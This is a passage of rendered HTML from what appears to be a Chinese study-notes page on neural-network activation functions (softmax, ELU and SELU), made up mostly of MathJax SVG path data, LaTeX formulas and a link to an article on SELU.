597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1333.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1833.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">S_i=\frac{e^i}{\sum_je^j}</script><h1 id="elu"><a href="#elu" class="headerlink" title="elu"></a>elu</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="13.015ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5752.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(389, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1167, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1667, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2111.7, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mtext" fill="red" stroke="red" transform="translate(2889.7, 0)"><path data-c="5C" d="M56 731Q56 740 62 745T75 750Q85 750 92 740Q96 733 270 255T444 -231Q444 -239 438 -244T424 -250Q414 -250 407 -240Q404 -236 230 242T56 731Z"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(500, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(778, 0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(1334, 0)"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(1640, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1918, 0)"></path></g><g data-mml-node="mo" transform="translate(5363.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<script type="math/tex; mode=display">f(x)=\begin{cases}
x & x \geq 0 \\
\alpha(e^x-1) & x < 0
\end{cases}</script><h1 id="selu"><a href="#selu" class="headerlink" title="selu"></a>selu</h1><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="14.651ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6475.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(389, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1167, 0)"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g><g data-mml-node="mi" transform="translate(1750, 0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path></g><g data-mml-node="mo" transform="translate(2390, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(2834.7, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mtext" fill="red" stroke="red" transform="translate(3612.7, 0)"><path data-c="5C" d="M56 731Q56 740 62 745T75 750Q85 750 92 740Q96 733 270 255T444 -231Q444 -239 438 -244T424 -250Q414 -250 407 -240Q404 -236 230 242T56 731Z"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(500, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(778, 0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(1334, 0)"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(1640, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1918, 0)"></path></g><g data-mml-node="mo" transform="translate(6086.7, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<p><a href="https://www.jianshu.com/p/3a43a6a860ef">李宏毅课程：SELU 激活函数</a></p>
<script type="math/tex; mode=display">f(x)=\lambda\begin{cases}
x & x \geq 0 \\
\alpha(e^x-1) & x < 0
\end{cases}</script><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="41.293ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 18251.6 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path></g><g data-mml-node="mo" transform="translate(917.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1973.6, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500, 0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(778, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1278, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1778, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(2278, 0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(2778, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(3278, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(3778, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(4278, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(4778, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(5278, 0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(5778, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(6278, 0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(6778, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(7278, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(7778, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(8278, 0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(8778, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(9278, 0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(9778, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(10278, 0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(10778, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(11278, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(11778, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(12278, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(12778, 0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 